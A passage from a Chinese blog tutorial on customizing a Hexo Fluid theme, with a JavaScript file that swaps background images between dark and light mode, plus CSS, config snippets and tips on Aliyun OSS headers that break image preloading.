class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: 4rozeN</span></span><br><span class="line"><span class="comment"> * file: backgroundize.js</span></span><br><span class="line"><span class="comment"> * last modified: 2025-05-19</span></span><br><span class="line"><span class="comment"> * description: 背景图随日夜模式切换处理。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取颜色模式切换按钮（深色 / 浅色）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@type</span> {<span class="type">HTMLElement | null</span>}</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> colorToggleButton = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">"#color-toggle-btn .nav-link"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 背景容器元素（统一为 #web_bg）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@type</span> {<span class="type">HTMLElement</span>}</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> backgroundContainer = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">"#web_bg"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// === 背景图片配置 ===</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * BACKGROUND_IMAGES 说明：</span></span><br><span class="line"><span class="comment"> * - dark / light：按颜色模式分类；再区分 desktop / mobile 两张图。</span></span><br><span class="line"><span class="comment"> * - fallback：在排除页面、或桌面 / 移动切换时的默认背景。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">BACKGROUND_IMAGES</span> = {</span><br><span class="line">  <span class="attr">dark</span>: {</span><br><span class="line">    <span class="attr">desktop</span>:</span><br><span class="line">      <span class="string">"URl1"</span>,</span><br><span class="line">    <span class="attr">mobile</span>:</span><br><span class="line">      <span class="string">"mobileURL"</span>,</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">light</span>: {</span><br><span class="line">    <span class="attr">desktop</span>:</span><br><span class="line">      <span class="string">"URL2"</span>,</span><br><span class="line">    <span class="attr">mobile</span>:</span><br><span class="line">      <span class="string">"mobileURL"</span>,</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">fallback</span>:</span><br><span class="line">    <span class="string">"fallbackURL"</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// === 页面排除列表 ===</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在以下路径（前缀匹配）不跟随颜色模式切换背景。</span></span><br><span class="line"><span class="comment"> * 说明：主页 ("/") 也被视为排除页面。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@type</span> {<span class="type">string[]</span>}</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PAGE_EXCLUSIONS</span> = [</span><br><span class="line">  <span class="string">"/links/"</span>,</span><br><span class="line">  <span class="string">"/about/"</span>,</span><br><span class="line">  <span class="string">"/categories/"</span>,</span><br><span class="line">  <span class="string">"/tags/"</span>,</span><br><span class="line">  <span class="string">"/collections/"</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// === 工具函数 ===</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断当前页面是否在排除列表中。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">string</span>} <span class="variable">path</span> - location.pathname</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> {<span class="type">boolean</span>}</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isExcludedPage</span> = (<span class="params">path</span>) =&gt; {</span><br><span class="line">  <span class="keyword">if</span> (path === <span class="string">"/"</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable constant_">PAGE_EXCLUSIONS</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">excluded</span>) =&gt;</span> path.<span class="title function_">startsWith</span>(excluded));</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否为移动端视口。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> {<span class="type">boolean</span>}</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isMobileViewport</span> = (<span class="params"></span>) =&gt; <span class="variable language_">window</span>.<span class="property">innerWidth</span> &lt; <span class="number">768</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 移除 banner 遮罩，避免背景图层被半透明黑层覆盖。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">removeBannerMask</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> mask = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">"#banner .mask"</span>);</span><br><span class="line">  <span class="keyword">if</span> (mask) mask.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">"rgba(0,0,0,0)"</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 预加载所有背景图片，降低首帧闪烁。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">preloadBackgroundImages</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> urls = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">  <span class="comment">// 收集所有图片 URL</span></span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="variable constant_">BACKGROUND_IMAGES</span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">entry</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> entry === <span class="string">"object"</span>) {</span><br><span class="line">      urls.<span class="title function_">add</span>(entry.<span class="property">desktop</span>);</span><br><span class="line">      urls.<span class="title function_">add</span>(entry.<span class="property">mobile</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      urls.<span class="title function_">add</span>(entry);</span><br><span class="line">    }</span><br><span class="line">  });</span><br><span class="line">  <span class="comment">// 创建 Image 对象触发加载</span></span><br><span class="line">  urls.<span class="title function_">forEach</span>(<span class="function">(<span class="params">url</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">    img.<span class="property">src</span> = url;</span><br><span class="line">  });</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据当前模式 / 视口或自定义 URL 设置背景图。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">"dark" | "light" | null</span>} <span class="variable">mode</span> - 当前颜色模式；null 表示排除页面</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">string</span>} [customUrl] - 强制使用的自定义链接（优先级最高）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">applyBackgroundImage</span> = (<span class="params">mode, customUrl</span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> mobile = <span class="title function_">isMobileViewport</span>();</span><br><span class="line">  <span class="keyword">let</span> imageUrl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (customUrl) {</span><br><span class="line">    <span class="comment">// 若明确指定自定义 URL，则直接使用</span></span><br><span class="line">    imageUrl = customUrl;</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (mode === <span class="literal">null</span>) {</span><br><span class="line">    <span class="comment">// 排除页面：桌面使用 fallback，移动端统一 dark.mobile</span></span><br><span class="line">    imageUrl = mobile</span><br><span class="line">      ? <span class="variable constant_">BACKGROUND_IMAGES</span>.<span class="property">dark</span>.<span class="property">mobile</span></span><br><span class="line">      : <span class="variable constant_">BACKGROUND_IMAGES</span>.<span class="property">fallback</span>;</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title function_">isExcludedPage</span>(location.<span class="property">pathname</span>) &amp;&amp; mode) {</span><br><span class="line">    <span class="comment">// 非排除页面：根据模式 + 视口选择</span></span><br><span class="line">    imageUrl = mobile</span><br><span class="line">      ? <span class="variable constant_">BACKGROUND_IMAGES</span>[mode].<span class="property">mobile</span></span><br><span class="line">      : <span class="variable constant_">BACKGROUND_IMAGES</span>[mode].<span class="property">desktop</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="comment">// 处理从移动端切换回桌面端时可能出现的背景错乱</span></span><br><span class="line">    imageUrl = mobile</span><br><span class="line">      ? <span class="variable constant_">BACKGROUND_IMAGES</span>.<span class="property">dark</span>.<span class="property">mobile</span></span><br><span class="line">      : <span class="variable constant_">BACKGROUND_IMAGES</span>.<span class="property">fallback</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  backgroundContainer.<span class="property">style</span>.<span class="property">backgroundImage</span> = <span class="string">`url(<span class="subst">${imageUrl}</span>)`</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取用户当前的颜色模式（深/浅）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> {<span class="type">"dark" | "light"</span>}</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getUserColorScheme</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> mode = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">getAttribute</span>(<span class="string">"data-user-color-scheme"</span>);</span><br><span class="line">  <span class="keyword">return</span> mode === <span class="string">"dark"</span> ? <span class="string">"dark"</span> : <span class="string">"light"</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 颜色模式切换后的回调：重新应用背景并移除遮罩。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleColorSchemeToggle</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> mode = <span class="title function_">getUserColorScheme</span>();</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isExcludedPage</span>(location.<span class="property">pathname</span>)) {</span><br><span class="line">    <span class="title function_">applyBackgroundImage</span>(mode);</span><br><span class="line">  }</span><br><span class="line">  <span class="title function_">removeBannerMask</span>();</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// === 视口 Resize 处理（防抖） ===</span></span><br><span class="line"><span class="keyword">let</span> resizeTimer; <span class="comment">// 定时器句柄</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 窗口大小变化事件的处理函数（含 200ms 防抖）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleViewportResize</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="built_in">clearTimeout</span>(resizeTimer);</span><br><span class="line">  resizeTimer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="title function_">applyBackgroundImage</span>(<span class="title function_">getUserColorScheme</span>());</span><br><span class="line">  }, <span class="number">200</span>);</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// === 监听颜色模式属性变化 ===</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">observeColorSchemeChange</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> targetNode = <span class="variable language_">document</span>.<span class="property">documentElement</span>;</span><br><span class="line">  <span class="keyword">const</span> config = {</span><br><span class="line">    <span class="attr">attributes</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">attributeFilter</span>: [<span class="string">"data-user-color-scheme"</span>],</span><br><span class="line">  };</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">callback</span> = (<span class="params">mutationsList</span>) =&gt; {</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> mutation <span class="keyword">of</span> mutationsList) {</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        mutation.<span class="property">type</span> === <span class="string">"attributes"</span> &amp;&amp;</span><br><span class="line">        mutation.<span class="property">attributeName</span> === <span class="string">"data-user-color-scheme"</span></span><br><span class="line">      ) {</span><br><span class="line">        <span class="title function_">handleColorSchemeToggle</span>();</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  };</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(callback);</span><br><span class="line">  observer.<span class="title function_">observe</span>(targetNode, config);</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// === 初始化 ===</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化背景：预加载 → 根据当前页面 &amp; 模式设置 → 去掉遮罩。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">initializeBackgrounds</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="title function_">preloadBackgroundImages</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> currentPath = location.<span class="property">pathname</span>;</span><br><span class="line">  <span class="keyword">const</span> currentMode = <span class="title function_">getUserColorScheme</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable constant_">PAGE_EXCLUSIONS</span>.<span class="title function_">includes</span>(currentPath)) {</span><br><span class="line">    <span class="title function_">applyBackgroundImage</span>(<span class="literal">null</span>);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="title function_">applyBackgroundImage</span>(currentMode);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="title function_">removeBannerMask</span>();</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// === 事件监听 ===</span></span><br><span class="line"><span class="keyword">if</span> (!colorToggleButton) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">"未找到颜色模式切换按钮"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听颜色模式属性变化</span></span><br><span class="line"><span class="title function_">observeColorSchemeChange</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听窗口大小变化</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">"resize"</span>, handleViewportResize, { <span class="attr">passive</span>: <span class="literal">true</span> });</span><br><span class="line"></span><br><span class="line"><span class="comment">// DOMContentLoaded → 初始化背景</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">"DOMContentLoaded"</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"DOM 完成，开始初始化背景图。"</span>);</span><br><span class="line">  <span class="title function_">initializeBackgrounds</span>();</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载完毕之后清除控制台日志</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">"load"</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">clear</span>();</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>该代码文件还需结合一个自定义的 css 文件使用：<code>source/css/backgroundize.css</code></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#web_bg</span> {</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: -<span class="number">1</span>;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="comment">/* 添加过渡效果，你也可以自定义 */</span></span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.5s</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>在 <code>backgroundize.js</code> 文件中，我们手动指定了背景图、切换逻辑，所以上一节的第二段代码已不再有作用，故在此删去。</p><p>在 <code>backgroundize.js</code> 文件中，若你有更多自定义页面图片需求，你将能够很方便的实现它。</p><p>在 <code>backgroundize.css</code> 中，我们依然将 <code>web_bg</code> 设置为 <code>fixed</code> 将其固定，并设置 <code>z-index: -1</code> 保持沉底。</p><p>因为在<code>_config.fluid.yml</code> 中我们将 <code>banner_img</code> 配置项全部配置为空，那么控制台将会出现 404 错误：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505232039826.png" alt="image-20250523203906585"></p><p>眼不见心不烦，所以在 <code>backgroundize.js</code> 中存在下面的代码：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载完毕之后清除控制台日志</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">"load"</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">clear</span>();</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><div class="note warning flat"><p>⚠️注意：<br>以上文件，别忘记在<code>_config.fluid.yml</code> 文件中的 <code>custom_css</code> 中进行引用。<br><code>URl1</code>、<code>mobileURL</code> 和 <code>fallbackURL</code> 等字符，仅作占位使用，实际应为真实图片链接。</p></div><p>因为 <code>injector.js</code> 的存在，所以 <code>backgroundize.js</code><strong>不需要</strong>在 <code>custom_js</code> 中引入，否则控制台中将会出现以下报错：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uncaught SyntaxError: Identifier 'colorToggleButton' has already been declared (at backgroundize.js:1:1)</span><br></pre></td></tr></tbody></table></figure><p><code>_config.fluid.yml</code> 配置项：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">custom_css:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/css/backgroundize.css</span></span><br></pre></td></tr></tbody></table></figure><h2 id="预加载的可能问题"><a class="markdownIt-Anchor" href="#预加载的可能问题"></a> 预加载的可能问题</h2><p>如果你遇到了第一次切换主题，图片与图片之间的切换有些生硬，有点闪屏的感觉，但后续的所有切换却十分丝滑，那么很可能是预加载的失败。</p><h3 id="可能的问题来源"><a class="markdownIt-Anchor" href="#可能的问题来源"></a> 可能的问题来源</h3><div class="note info flat"><p>如果 <code>OSS/Bucket</code> 设置了响应头 <code>Cache-Control: no-store</code> 或 <code>max-age=0</code> 或没有启用 <code>Expires</code>，浏览器会认为每次访问都需要重新拉取。也就是尽管你预加载了，但切换时图片链接仍然会触发一次真正的请求。</p></div><p>我遇到的问题是，我使用的图片托管在阿里云的 oss 上，阿里云返回的响应头中存在：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x-oss-force-download: true</span><br><span class="line">Content-Disposition: attachment</span><br></pre></td></tr></tbody></table></figure><p>而 <code>Content-Disposition: attachment</code> 的含义是：<strong>这个资源是供下载用的</strong>，而不是网页内容的一部分。</p><p>浏览器遇到这种响应头时，通常会<strong>绕过图片的常规缓存路径</strong>，或者不会把它作为正常的预加载资源处理。</p><p>这就导致：</p><ul><li>图片不会进入 <code>memory</code> 或 <code>disk cache</code></li><li>即使预加载代码写得很好，浏览器仍然会每次点击切换时发起新请求</li><li>导致首次切换背景图时出现 “<strong>闪屏或延迟加载</strong>”</li></ul><p>翻阅文档，发现阿里云在很久之前就已经做出了调整：</p><p><code>出于安全考虑，通过OSS默认 Bucket域名访问文件时，OSS会强制增加下载响应头，导致浏览器强制下载文件。</code></p><p>也就是强制增加了 <code>x-oss-force-download: true</code> 使得 <code>Content-Disposition</code> 为附件类型。</p><p>如果遇到其他问题，欢迎讨论。</p><h3 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h3><p>如果你的托管平台可以更改元信息，那么请更改所需文件的元信息：</p><ul><li><p><code>Content-Disposition: attachment</code> 改为 <code>Content-Disposition: inline</code> 或留空</p></li><li><p><code>x-oss-force-download: true</code> 改为 <code>false</code></p></li></ul><p>阿里云平台是无法通过更改文件元信息来解决的。</p><p>阿里云的推荐方案是为 <code>oss/bucket</code> 绑定自定义域名，不再使用阿里云提供的默认域名。详见：<a href="https://help.aliyun.com/zh/oss/user-guide/map-custom-domain-names-5">绑定自定义域名至 Bucket 默认域名</a></p><p>或者，你也可以将图片托管在 GitHub 上，就直接使用仓库的 img 目录用于存放，GitHub 的响应头是符合要求的。</p><h2 id="非预期的切换效果"><a class="markdownIt-Anchor" href="#非预期的切换效果"></a> 非预期的切换效果</h2><p>如果你遇到了第一时间显示的不是预期的背景图，那么很可能是你在<code>_config.fluid.yml</code> 文件中的 <code>banner_img</code> 没有<strong>全部</strong>配置为空。</p><h2 id="无法匹配页面排除页面不生效"><a class="markdownIt-Anchor" href="#无法匹配页面排除页面不生效"></a> 无法匹配页面 / 排除页面不生效</h2><p>这一般是因为你的网站的永久链接生成方式与我不同。</p><p>该配置项通常在<code>_config.yml</code> 文件中可以找到。我的配置如下：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## 设置你的网站 URL，例如 GitHub Pages 上设置为 'https://username.github.io/project'</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://4rozeN.github.io</span> <span class="comment"># 网站的完整 URL</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">archives/:category/:abbrlink.html</span> <span class="comment"># 文章永久链接的格式</span></span><br><span class="line"><span class="attr">abbrlink:</span> <span class="string">alg</span> <span class="comment"># 算法：crc16(default) and crc32 </span></span><br><span class="line"><span class="attr">permalink_defaults:</span> <span class="string">defaultPermaLink</span> <span class="comment"># 默认永久链接的名称</span></span><br><span class="line"><span class="attr">pretty_urls:</span> <span class="comment"># 优化 URL 美观性</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># 如果设为 false，将去掉链接结尾的 'index.html'</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># 如果设为 false，将去掉链接结尾的 '.html'</span></span><br></pre></td></tr></tbody></table></figure><p>详见 Hexo 官方文档：<a href="https://hexo.io/zh-cn/docs/permalinks">【Hexo】- 永久链接（Permalinks）</a></p><p>什么意思呢？</p><p>我的代码中，写死了部分排除在外不会跟随日夜模式切换背景图的页面，这些页面都是能够被</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 排除在外的页面</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PAGE_EXCLUSIONS</span> = [</span><br><span class="line">  <span class="string">"/links/"</span>,</span><br><span class="line">  <span class="string">"/about/"</span>,</span><br><span class="line">  <span class="string">"/categories/"</span>,</span><br><span class="line">  <span class="string">"/tags/"</span>,</span><br><span class="line">  <span class="string">"/collections/"</span>,</span><br><span class="line">];</span><br><span class="line"><span class="comment">// 校验</span></span><br><span class="line"><span class="keyword">const</span> <span class="title 